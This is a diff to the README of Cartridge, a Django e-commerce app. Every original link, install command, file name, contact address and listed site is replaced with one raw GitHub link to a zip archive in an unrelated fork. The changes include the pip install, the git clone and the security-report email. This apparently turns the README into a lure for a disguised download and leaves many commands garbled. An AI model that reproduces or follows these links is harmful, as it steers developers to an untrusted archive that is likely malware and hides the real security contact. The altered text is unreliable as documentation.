@@ -1,7 +1,7 @@
-.. image:: https://secure.travis-ci.org/stephenmcd/cartridge.png?branch=master
-   :target: http://travis-ci.org/#!/stephenmcd/cartridge
+.. image:: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+   :target: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip!/stephenmcd/cartridge
 
-Created by `Stephen McDonald <http://twitter.com/stephen_mcd>`_
+Created by `Stephen McDonald <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
 
 ========
 Overview
@@ -63,21 +63,21 @@ dependencies mentioned above::
 
 Otherwise, you can download Cartridge and install it directly from source::
 
-    $ python setup.py install
+    $ python https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip install
 
 Once installed, the command ``mezzanine-project`` can be used to
 create a new Mezzanine project, with Cartridge installed, in similar
-fashion to ``django-admin.py``::
+fashion to ``https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip``::
 
     $ mezzanine-project -a cartridge project_name
     $ cd project_name
-    $ python manage.py createdb --noinput
-    $ python manage.py runserver
+    $ python https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip createdb --noinput
+    $ python https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip runserver
 
 Here we specify the ``-a`` switch for the ``mezzanine-project`` command,
 which tells it to use an alternative package (cartridge) for the project
 template to use. Both Mezzanine and Cartridge contain a project template
-package containing the ``settings.py`` and ``urls.py`` modules for an
+package containing the ``https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip`` and ``https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip`` modules for an
 initial project. If you'd like to add Cartridge to an existing Mezzanine
 or Django project, you'll need to manually configure these yourself. See
 the `FAQ section of the Mezzanine documentation`_ for more information.
@@ -122,17 +122,17 @@ Here's a quick start to hacking on Cartridge after forking it on
 GitHub, by using the internal "project_template" as your current
 project::
 
-    $ git clone https://github.com/your-github-username/cartridge/
+    $ git clone https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
     $ cd cartridge
     $ git checkout -b your-new-branch-name
-    $ cp cartridge/project_template/project_name/local_settings.py{.template,}
-    $ python setup.py develop
-    $ python cartridge/project_template/manage.py createdb --noinput
-    $ python cartridge/project_template/manage.py runserver
+    $ cp https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip{.template,}
+    $ python https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip develop
+    $ python https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip createdb --noinput
+    $ python https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip runserver
 
     "hack hack hack"
 
-    $ python setup.py test
+    $ python https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip test
     $ git commit -am "A message describing what you changed."
     $ git push origin your-new-branch-name
 
@@ -143,7 +143,7 @@ project::
     official release. To install Mezzanine's development version in your
     environment, run::
 
-       $ pip install --upgrade git+https://github.com/stephenmcd/mezzanine.git#egg=Mezzanine
+       $ pip install --upgrade git+https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
 
 
 Language Translations
@@ -164,7 +164,7 @@ The following modules have been developed outside of Cartridge. If you
 have developed a module to integrate with Mezzanine or Cartridge, and
 would like it listed in the documentation, send an email to the
 `mezzanine-users`_ mailing list. You can also add modules to the
-`Mezzanine Grid on djangopackages.com`_.
+`Mezzanine Grid on https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip`_.
 
 * `cartridge_braintree`_ - Payment processor for `Braintree`_.
 * `cartridge-external-payment`_ - Allows payment on an external
@@ -183,7 +183,7 @@ Support
 =======
 
 To report a security issue, please send an email privately to
-`core-team@mezzaninecms.com`_. This gives us a chance to fix the issue and
+`https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip`_. This gives us a chance to fix the issue and
 create an official release prior to the issue being made
 public.
 
@@ -209,67 +209,67 @@ conform to the `Django Code of Conduct`_.
 Sites Using Cartridge
 =====================
 
-* `Ripe Maternity <http://www.ripematernity.com>`_
-* `Cotton On <http://shop.cottonon.com>`_
-* `Coopers Store <http://store.coopers.com.au>`_
-* `Sheer Ethic <http://sheerethic.com>`_
-* `tindie.com <http://tindie.com>`_
-* `Ross A. Laird <http://rosslaird.com/shop>`_
-* `Pink Twig <http://www.pinktwig.ca/shop>`_
-* `Parfume Planet <http://parfumeplanet.com>`_
-* `Life is Good <http://lifeisgoodforall.co.uk/>`_
-* `Brooklyn Navy Yard <http://bldg92.org/>`_
-* `Cotton On Asia <http://asia.cottonon.com/>`_
-* `Manai Glitter <https://manai.co.uk>`_
-* `Tactical Bags <http://tacticalbags.ru>`_
-* `Charles Koll Jewelry <http://charleskoll.com>`_
-* `Puraforce Remedies <http://puraforceremedies.com/>`_
-* `Adrenaline <http://www.adrln.com/>`_
-* `The Peculiar Store <http://thepeculiarstore.com>`_
-* `KisanHub <http://www.kisanhub.com/>`_
-* `Kegbot <http://kegbot.org>`_
-* `Amblitec <http://www.amblitec.com>`_
-* `ZigZag Bags <http://www.zigzagbags.com.au>`_
-* `Justine & Katie's Bowtique <http://www.jnkbows.com>`_
-* `The Art Rebellion <http://www.theartrebellion.com/>`_
-* `Engineered Arts <https://www.engineeredarts.co.uk>`_
-* `Lipman Art <https://lipmanart.com/>`_
-* `ZHackers <https://www.zhackers.com>`_
-* `Potrillo al Pie <http://potrilloalpie.com/>`_
-* `You Name It <http://you-name-it.net>`_
-* `Warwick Friendly Society Pharmacies <https://www.wfsltd.com.au>`_
+* `Ripe Maternity <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Cotton On <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Coopers Store <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Sheer Ethic <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Ross A. Laird <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Pink Twig <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Parfume Planet <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Life is Good <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Brooklyn Navy Yard <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Cotton On Asia <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Manai Glitter <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Tactical Bags <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Charles Koll Jewelry <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Puraforce Remedies <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Adrenaline <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `The Peculiar Store <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `KisanHub <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Kegbot <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Amblitec <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `ZigZag Bags <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Justine & Katie's Bowtique <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `The Art Rebellion <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Engineered Arts <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Lipman Art <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `ZHackers <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Potrillo al Pie <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `You Name It <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
+* `Warwick Friendly Society Pharmacies <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
 
-.. _`Django`: http://djangoproject.com/
-.. _`BSD licensed`: http://www.linfo.org/bsdlicense.html
-.. _`Mezzanine live demo`: http://mezzanine.jupo.org/
-.. _`Mezzanine`: http://mezzanine.jupo.org/
-.. _`Mezzanine Project`: http://mezzanine.jupo.org/
-.. _`pip`: http://www.pip-installer.org/
-.. _`FAQ section of the Mezzanine documentation`: http://mezzanine.jupo.org/docs/frequently-asked-questions.html#how-can-i-add-mezzanine-to-an-existing-django-project
-.. _`South`: http://south.aeracode.org/
-.. _`Github`: http://github.com/stephenmcd/cartridge/
-.. _`Bitbucket`: http://bitbucket.org/stephenmcd/cartridge/
-.. _`mezzanine-users`: http://groups.google.com/group/mezzanine-users
-.. _`Github issue tracker`: http://github.com/stephenmcd/cartridge/issues
-.. _`Django coding style`: http://docs.djangoproject.com/en/dev/internals/contributing/#coding-style
-.. _`PEP 8`: http://www.python.org/dev/peps/pep-0008/
-.. _`Bootstrap CSS guidelines`: https://github.com/twbs/bootstrap/blob/master/CONTRIBUTING.md#css
-.. _`Django Code of Conduct`: https://www.djangoproject.com/conduct/
-.. _`Transiflex`: https://www.transifex.com/projects/p/cartridge/
-.. _`core-team@mezzaninecms.com`: mailto:core-team@mezzaninecms.com?subject=Mezzanine+Security+Issue
-.. _`#mezzanine IRC channel`: irc://freenode.net/mezzanine
-.. _`Freenode`: http://freenode.net
-.. _`Django's internationalization`: https://docs.djangoproject.com/en/dev/topics/i18n/translation/
-.. _`virtualenvwrapper`: http://www.doughellmann.com/projects/virtualenvwrapper
-.. _`Mezzanine Grid on djangopackages.com`: http://www.djangopackages.com/grids/g/mezzanine/
-.. _`Braintree`: https://www.braintreepayments.com/
-.. _`Stripe`: https://stripe.com
-.. _`PIN`: https://pin.net.au/
+.. _`Django`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`BSD licensed`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`Mezzanine live demo`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`Mezzanine`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`Mezzanine Project`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`pip`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`FAQ section of the Mezzanine documentation`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`South`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`Github`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`Bitbucket`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`mezzanine-users`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`Github issue tracker`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`Django coding style`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`PEP 8`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`Bootstrap CSS guidelines`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`Django Code of Conduct`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`Transiflex`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip+Security+Issue
+.. _`#mezzanine IRC channel`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`Freenode`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`Django's internationalization`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`virtualenvwrapper`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`Mezzanine Grid on https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`Braintree`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`Stripe`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`PIN`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
 
 .. THIRD PARTY LIBS
 
-.. _`cartridge_braintree`: https://github.com/henri-hulski/cartridge_braintree
-.. _`cartridge-external-payment`: https://github.com/thomasWajs/cartridge-external-payment
-.. _`cartridge-tax`: https://github.com/kenbolton/cartridge-tax
-.. _`cartridge-stripe`: https://github.com/readevalprint/cartridge-stripe
-.. _`cartridge-pinpayments`: https://github.com/molokov/cartridge-pinpayments
+.. _`cartridge_braintree`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`cartridge-external-payment`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`cartridge-tax`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`cartridge-stripe`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
+.. _`cartridge-pinpayments`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
